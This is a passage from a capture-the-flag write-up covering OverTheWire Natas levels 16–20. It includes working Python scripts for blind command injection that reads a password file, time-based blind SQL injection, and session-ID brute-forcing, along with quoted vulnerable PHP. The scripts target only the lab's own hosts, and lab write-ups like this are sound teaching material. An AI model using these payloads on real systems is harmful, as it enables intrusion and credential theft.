We can do that thanks to [Command substitution](https://en.wikipedia.org/wiki/Command_substitution):
> Command substitution is a facility that allows a command to be run and its output to be pasted back on the command line as arguments to another command.

This neat feature is done usually by using backquotes as delimiters, but they're sanitized out of our input. Another common way to do that is using `$(...)`, where we can input our code inside of the parenthesis to be run.  To retrieve the password, we could just do `$(cat ../../../../etc/natas_webpass/natas17)` , but what would happen is it gets fed into `grep` due to command substitution, which then would be run as `grep -i "$(cat ../../../../etc/natas_webpass/natas17)" dictionary.txt` $\Rightarrow$ `grep -i "{password}" dictionary.txt` and then return nothing since it definitely doesn't exists there. We need to circumvent the search inside the file and retrieve the password. <br>
It's oddly similar to the previous challenge, a [Blind OS Command Injection](https://portswigger.net/web-security/os-command-injection#blind-os-command-injection-vulnerabilities) where we can reconstruct the password by asking information to the server and then analyzing the answers it gives us. In this case, we can go character-by-character and ask if it exists where the solution is stored. If it does, we append a random word, and the command becomes `grep -i "{password}injection" dictionary.txt`. We need to do that since 
- If the character doesn't exist, `grep -i "{}injection" dictionary.txt` does find "injection" in the dictionary.
- If it does exist, it searches `grep -i "{character}injection" dictionary.txt`, which is an impossible word and thus doesn't display anything. 

We can use this to our advantage and scan when we get a response or not. To get a single character from a file, we can use `grep` inside itself, and the payload will look something like: `$(grep {character} /etc/natas_webpass/natas17)injection`<br>
We can repurpose the previous Python script to run on this site: <br>
[`blind-command.py`](/scripts/lvl16/blind-command.py)
```python
import string       # For password generation
import requests     # For http requests
from requests.auth import HTTPBasicAuth

# Basic htpp request variables
login = HTTPBasicAuth("natas16", "****") # Username and password
url = "http://natas16.natas.labs.overthewire.org/"

# Password generator
valid_characters = string.digits + string.ascii_letters
present_characters = ""

# For all of the characters in the possible list
for c in valid_characters:
        # Our payload
        payload = "$(grep " + c + " /etc/natas_webpass/natas17)injection"
        # We need to modify the URL with our payload
        new_url = url + "?needle=" + payload + "&submit=Search"
        response = requests.get(new_url, auth = login, verify = False)
        # We got a hit
        if "injection" not in response.text:
            print("Found: " + c)
            present_characters += c

print("Found following characters: " + present_characters)
```
Doing so, we found all of the possible characters present in the password, but they aren't in order. To do so, we'd need to know where the password starts or ends. `grep` has a nice trick up its sleeve to do so: if we start a word with the character `^` (which represents the beginning of a line), we can reconstruct it from there from the following payload = `$(grep ^{password} /etc/natas_webpass/natas17)injection`. So, let's fix the code and get the password: <br>
[`better-blind-command.py`](/scripts/lvl16/better-blind-command.py)
```python
import string       # For password generation
import requests     # For http requests
from requests.auth import HTTPBasicAuth

# Basic htpp request variables
login = HTTPBasicAuth("natas16", "****") # Username and password
url = "http://natas16.natas.labs.overthewire.org/"

# Password generator
valid_characters = string.digits + string.ascii_letters
present_characters = ""
password = ""
max_length = 32
count = 0;

# For all of the characters in the possible list
for c in valid_characters:
        # Our payload
        payload = "$(grep " + c + " /etc/natas_webpass/natas17)injection"
        # We need to modify the URL with our payload
        new_url = url + "?needle=" + payload + "&submit=Search"
        response = requests.get(new_url, auth = login, verify = False)
        # We got a hit
        if "injection" not in response.text:
            print("Found: " + c)
            present_characters += c

print("Found following characters: " + present_characters + "\nStarting to reconstruct password...")

while count <= max_length:
    for c in present_characters:
        # Our new payload
        payload = "$(grep ^" + password + c + " /etc/natas_webpass/natas17)injection"
        # We need to modify the URL with our new payload
        new_url = url + "?needle=" + payload + "&submit=Search"
        response = requests.get(new_url, auth = login, verify = False)
        # We got a hit
        if "injection" not in response.text:
            print("Found: " + password + c)
            password += c
            count += 1

print("Password: " + password)
```

## Level 17 <a name="level17"></a>
Landing on the site, we see this:

![Level 17](/imgs/lvl17/screenshot.png)

Again we have some kind of username check, but this time done in SQL:
```php
<?php  
  
/*  
CREATE TABLE `users` (  
`username` varchar(64) DEFAULT NULL,  
`password` varchar(64) DEFAULT NULL  
);  
*/  
  
if(array_key_exists("username", $_REQUEST)) {  
	$link = mysqli_connect('localhost', 'natas17', '<censored>');  
	mysqli_select_db($link, 'natas17');  
  
	$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";  
	if(array_key_exists("debug", $_GET)) {  
		echo "Executing query: $query<br>";  
	}  
  
	$res = mysqli_query($link, $query);  
	if($res) {  
		if(mysqli_num_rows($res) > 0) {  
			//echo "This user exists.<br>";  
		} else {  
			//echo "This user doesn't exist.<br>";  
		}  
	} else {  
		//echo "Error in query.<br>";  
	}  
  
	mysqli_close($link);  
} else {  
?>  
  
<form action="index.php" method="POST">  
Username: <input name="username"><br>  
<input type="submit" value="Check existence" />  
</form>  
<?php } ?>
```
Now a problem arises: there is no output on whatever we do. The echo lines are commented out, thus no matter what we input, we get no visible response. Maybe we can't see it, but feel it... <br>
Let's try something we know works: the username `natas18` (which must be present in the table, otherwise we can't move on). If we input that, as before, there's nothing shown. But let's try a secret tab in the Developer Tools[^1]: the timings. Here, we can see how long the page took to load certain things inside, from connecting, to the set up, and then the time it took to get a response:

![Timings](/imgs/lvl17/timings.png) 

In this case, the page waited ~70ms to get a response. Knowing that, we can abuse the timings inside the web app to extract information about the password, just like we did before. This type of attack, called [Time Based Blind SQL Injection](https://beaglesecurity.com/blog/vulnerability/time-based-blind-sql-injection.html), is usually checked with the following payload: ``a" OR IF(1=1, SLEEP(5), 0) -- ``. Let's try it and see what happens:

![Attack](/imgs/lvl17/attack.png)

As you can see, we get a long delay, compatible with the `SLEEP(5)` we set up (~70ms + 5000ms = ~5s). Let's modify [Level 15](#level15)'s code to add a delay and retrieve the password: <br>
[`time-blind-sql.py`](/scripts/lvl17/time-blind-sql.py)
```python
import string       # For password generation
import requests     # For http requests
from requests.auth import HTTPBasicAuth

# Basic htpp request variables
login = HTTPBasicAuth("natas17", "****") # Username and password
headers = {"Content-Type": "application/x-www-form-urlencoded"}
url = "http://natas17.natas.labs.overthewire.org/"

# Password generator
count = 1
password = ""
max_lenght = 32
valid_characters = string.digits + string.ascii_letters

# While we haven't found the password...
while count <= max_lenght:
    # ... for each valid character (numbers, lowercase and uppercase)
    for c in valid_characters:
        # Our payload
        payload = "natas18\" AND IF(BINARY substring(password, 1, " + str(count) + ") = \"" + password + c + "\", SLEEP(2), False) -- "
        response = requests.post(url, data = {"username": payload}, headers = headers, auth = login, verify = False)
        # We got a hit
        if response.elapsed.total_seconds() > 2:
            print("Found: " + password + c)
            password += c
            count += 1

print("Final password: " + password)
```
And we'll get the password for the next level.

## Level 18 <a name="level18"></a>
Landing on the site, we see this:

![Level 18](/imgs/lvl18/screenshot.png)

A login page with username and password. Like the other previous levels, there's something we must exploit to gain access. Let's look at the source code:
```php
`<?php  
  
$maxid = 640; // 640 should be enough for everyone  
  
function isValidAdminLogin() { /* {{{ */  
	if($_REQUEST["username"] == "admin") {  
		/* This method of authentication appears to be unsafe and has been disabled for now. */  
		//return 1;  
	}  
  
	return 0;  
}  
/* }}} */  
function isValidID($id) { /* {{{ */  
	return is_numeric($id);  
}  
/* }}} */  
function createID($user) { /* {{{ */  
	global $maxid;  
	return rand(1, $maxid);  
}  
/* }}} */  
function debug($msg) { /* {{{ */  
	if(array_key_exists("debug", $_GET)) {  
		print "DEBUG: $msg<br>";  
	}  
}  
/* }}} */  
function my_session_start() { /* {{{ */  
	if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {  
		if(!session_start()) {  
			debug("Session start failed");  
			return false;  
		} else {  
			debug("Session start ok");  
			if(!array_key_exists("admin", $_SESSION)) {  
				debug("Session was old: admin flag set");  
				$_SESSION["admin"] = 0; // backwards compatible, secure  
			}  
			return true;  
		}  
	}  
  
	return false;  
}  
/* }}} */  
function print_credentials() { /* {{{ */  
	if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {  
		print "You are an admin. The credentials for the next level are:<br>";  
		print "<pre>Username: natas19\n";  
		print "Password: <censored></pre>";  
	} else {  
		print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";  
	}  
}  
/* }}} */  
  
$showform = true;  
if(my_session_start()) {  
	print_credentials();  
	$showform = false;  
} else {  
	if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {  
		session_id(createID($_REQUEST["username"]));  
		session_start();  
		$_SESSION["admin"] = isValidAdminLogin();  
		debug("New session started");  
		$showform = false;  
		print_credentials();  
	}  
}  
  
if($showform) {  
?>  
  
<p>  
Please login with your admin account to retrieve credentials for natas19.  
</p>  
  
<form action="index.php" method="POST">  
Username: <input name="username"><br>  
Password: <input name="password"><br>  
<input type="submit" value="Login" />  
</form>  
<?php } ?>`
```
We see every time we log in, we instantiate a new session with a specific `PHPSESSID`, which is then added to the site's cookies. Then we check if: `$_SESSION` is started + we're `admin` + `PHPSESSID == 1`, and that logs us in as admin and we can see the password for the next challenge. <br>
There's something to notice though: by "fixing" the security issue in the code, the `isValidAdminLogin()` function always returns 0 if the username is `admin`, and if we try anything else, we fall into 
```php
if(!array_key_exists("admin", $_SESSION)) { debug("Session was old: admin flag set"); $_SESSION["admin"] = 0; // backwards compatible, secure }
```
 and get automatically set as `admin` with a value of 0. Thus we're seen as `admin` no matter what we do. We can see that by appending `&debug` to our URL:

![Debug](/imgs/lvl18/debug.png)

 Now we satisfy two of the conditions necessary for the authentication, where the other one is having a `PHPSESSID == 1`. If we try changing the cookies, we get nowhere:
 
![Cookie](/imgs/lvl18/cookie.png)

Strange. But if we dig deeper, we see there's no function that sets `$_SESSION["admin"]` to any value. This means something is hidden to us, and it's not as simple as changing the cookie of a session to get in. <br>
Now, something is kinda odd about the code: we have a fixed amount of session ID we can have from `$maxid = 640; // 640 should be enough for everyone`, and if they're enough for everyone, that includes the admin. Thus, we can brute force our way in by trying each ID one-by-one and see if we can get in without even knowing the server-side function to set IDs, in an attack known as [Session Hijacking](https://capec.mitre.org/data/definitions/593.html). Let's modify [Level 15](#level15)'s script to work in our case: <br>
[`session-hijacking.py`](/scripts/lvl18/session-hijacking.py)
```python
import string       # For password generation
import requests     # For http requests
from requests.auth import HTTPBasicAuth

# Basic htpp request variables
login = HTTPBasicAuth("natas18", "****") # Username and password
url = "http://natas18.natas.labs.overthewire.org/"

# Possible IDs
count = 1
max_ids = 640

# While we haven't found the ID...
while count <= max_ids:
    # Our custom cookie
    session = "PHPSESSID=" + str(count)
    cookie = {"Cookie": session}
    response = requests.post(url, headers = cookie, auth = login, verify = False)
    # We got a hit
    if "You are an admin" in response.text:
        print("Found: " + str(count))
        break

    count += 1
```
And we get the solution:
```html
<html>
	<head>
		...
	</head>
	<body>
		<h1>natas18</h1>
		<div id="content">
			You are an admin. The credentials for the next level are:<br>
			<pre>Username: natas19
			Password: ****</pre>
			<div id="viewsource">
			<a href="index-source.html">View sourcecode</a></div>
		</div>
	</body>
</html>
```

## Level 19 <a name="level19"></a>
Landing on the site, we see this:

![Level 19](/imgs/lvl19/screenshot.png)

Same as before, but now IDs are not sequential, and no source code? That sounds like a real headache... Let's see what we're working with, by trying a random username like `aa`:

![Cookie](/imgs/lvl19/cookie.png)

We now have an encoded cookie `PHPSESSID=3338332d6161`. Now, it might not be obvious at first glance, but if we read it again, we see there are two numbers repeated: `6161`, and our username was `aa`. This is a good indication that the username is encoded into the cookie, but we can confirm it by noticing the numbers are [ASCII](https://en.wikipedia.org/wiki/ASCII) representation of characters in hexadecimal format. In fact, if we use an ASCII table and [decode](https://gchq.github.io/CyberChef/#recipe=From_Charcode('Space',16)&input=MzMgMzggMzMgMmQgNjEgNjE) it, we get `PHPSESSID=383-aa`. <br>
We now know how it is encoded, and we can assume it needs the username `admin` (which is `61646d696e`), but there are three random numbers before it, thus maxing out at 999 possibile sessions under admin. We can brute force our way in modifying a bit the script from [Level 18](#level18):
[`encoded-session-hijacking.py`](/scripts/lvl19/encoded-session-hijacking.py)
```python
import string       # For password generation
import requests     # For http requests
from requests.auth import HTTPBasicAuth

# Basic htpp request variables
login = HTTPBasicAuth("natas19", "****") # Username and password
url = "http://natas19.natas.labs.overthewire.org/"

# Possible IDs
count = 1
max_ids = 999
c = ""

# While we haven't found the ID...
while count <= max_ids:
    # Create hexadecimal representation of ASCII character
    code = format(count, "03d")        # Represent numbers in xxx format
    code = list(bytes(code, 'ascii')) # Translate to ASCII
    for v in code:
        c += str(hex(v)[2:])        # Translate to hex

    # Our custom cookie
    session = "PHPSESSID=" + c + "2d61646d696e" # PHPSESSID={number}-admin
    cookie = {"Cookie": session}
    response = requests.post(url, headers = cookie, auth = login, verify = False)
    # We got a hit
    if "You are an admin" in response.text:
        print("Found: " + session)
        break
    c = ""
    count += 1
```
And we get our successful cookie as `PHPSESSID=3238312d61646d696e`, or `281-admin`. Modifying the cookie through the Developer Tools[^1], we get the password:
```html
<html>
	<head>
		...
	</head>
	<body>
		<h1>natas19</h1>
		<div id="content">
			<p>
				<b>
					This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
				</b>
			</p>
			You are an admin. The credentials for the next level are:<br>
			<pre>Username: natas20
			Password: ****</pre>
		</div>
	</body>
</html>
```

## Level 20 <a name="level20"></a>
Landing on the site, we see this:

![Level 20](/imgs/lvl20/screenshot.png)

Seems like we're already logged in as a random guest, and we need to become admin. Let's look at the source code:
```php
<?php  
  
function debug($msg) { /* {{{ */  
	if(array_key_exists("debug", $_GET)) {  
		print "DEBUG: $msg<br>";  
	}  
}  
/* }}} */  
function print_credentials() { /* {{{ */  
	if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {  
		print "You are an admin. The credentials for the next level are:<br>";  
		print "<pre>Username: natas21\n";  
		print "Password: <censored></pre>";  
	} else {  
		print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";  
	}  
}  
/* }}} */  
  
/* we don't need this */  
function myopen($path, $name) {  
	//debug("MYOPEN $path $name");  
	return true;  
}  
  
/* we don't need this */  
function myclose() {  
	//debug("MYCLOSE");  
	return true;  
}  
  
function myread($sid) {  
	debug("MYREAD $sid");  
	if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {  
		debug("Invalid SID");  
		return "";  
	}  
	$filename = session_save_path() . "/" . "mysess_" . $sid;  
	if(!file_exists($filename)) {  
		debug("Session file doesn't exist");  
		return "";  
	}  
	debug("Reading from ". $filename);  
	$data = file_get_contents($filename);  
	$_SESSION = array();  
	foreach(explode("\n", $data) as $line) {  
		debug("Read [$line]");  
		$parts = explode(" ", $line, 2);  
		if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];  
		}  
	return session_encode() ?: "";  
}  
  
function mywrite($sid, $data) {  
	// $data contains the serialized version of $_SESSION  
	// but our encoding is better  
	debug("MYWRITE $sid  $data");  
	// make sure the sid is alnum only!!  
	if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {  
		debug("Invalid SID");  
		return;  
	}  
	$filename = session_save_path() . "/" . "mysess_" . $sid;  
	$data = "";  
	debug("Saving in ". $filename);  
	ksort($_SESSION);  
	foreach($_SESSION as $key => $value) {  
		debug("$key => $value");  
		$data .= "$key  $value\n";  
	}  
	file_put_contents($filename, $data);  
	chmod($filename, 0600);  
	return true;  
}  
  
/* we don't need this */  
function mydestroy($sid) {  
	//debug("MYDESTROY $sid");  
	return true;  
}  
/* we don't need this */  
function mygarbage($t) {  
	//debug("MYGARBAGE $t");  
	return true;  
}  
  
session_set_save_handler(  
	"myopen",  
	"myclose",  
	"myread",  
	"mywrite",  
	"mydestroy",  
	"mygarbage");  
session_start();  
  
if(array_key_exists("name", $_REQUEST)) {  
	$_SESSION["name"] = $_REQUEST["name"];  
	debug("Name set to " . $_REQUEST["name"]);  
}  
  
print_credentials();  
  
$name = "";  
if(array_key_exists("name", $_SESSION)) {  
	$name = $_SESSION["name"];  
}  
  
?>  
  
<form action="index.php" method="POST">  
Your name: <input name="name" value="<?=$name?>">`
```
That's a lot of code. Let's see what it actually does: we're enabling debug by adding `?debug` to our URL and see what it prints out:

![Debug](/imgs/lvl20/debug.png)

Seems like our name is being written to a file inside `/var/lib/php/sessions/mysess_{encoded string}` by the function `mywrite()` in the source. Looks like have some kind of file management going on (as indicated from the functions `myopen()` \<empty>, `myclose()` \<empty>, `myread()`, `mywrite()`, `mydestroy()` \<empty>, and `mygarbage()` \<empty>). <br>
Reading the code carefully, a few things pop up as strange: for example, in the `mywrite()` function we write `$data` which contains `$key $value\n`, but we only input the `$name`, and then in `myread()` it runs through every line of the file `foreach(explode("\n", $data) as $line)`. Now this looks like a vulnerability. If we can inject both the `$key` and `$value` inside the file, we can then read it and use it to gain access to the password. Something like: `"test\nadmin 1"` $\Rightarrow$ `"test {random value}\nadmin 1"` $\Rightarrow$ read as `test {random value}` and `admin 1`. Since it authenticates only the last line, we become admin. <br>
 
## Final Notes <a name="finalnotes"></a>
This project is under the [GPL-3.0 License](https://www.gnu.org/licenses/gpl-3.0.html). Any use or distribution is completely free, unless edited. <br>
[OverTheWire Natas](https://overthewire.org/wargames/natas/), its challenges and solutions are all under their domain. I claim nothing. If you liked the challenges, please consider [donating](https://overthewire.org/information/donate.html) to them. <br>
Huge thanks to [CAPEC](https://capec.mitre.org/index.html) and [CWE](https://cwe.mitre.org/) for explanations and code examples. <br>
Main contributors:
\- [Unpwnabl](https://github.com/unpwnabl) (owner)

---

[^1]: I'll be using FireFox, so DevTools and some shortcuts are different from one another, although they're mostly similar in functionality.
[^2]: It's also written in the [main page](https://overthewire.org/wargames/natas/) of the web challenges, if one doesn't want to use hints.
[^3]: \- `convert` is part of [ImageMagick](https://github.com/ImageMagick/ImageMagick), necessary to have a smaller image (9x9 is a arbitrary dimension I chose). <br>
\- `>>` redirect stdout to file. <br>
\- Thanks to [Synactivy](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there)  for the explanation and some commands.







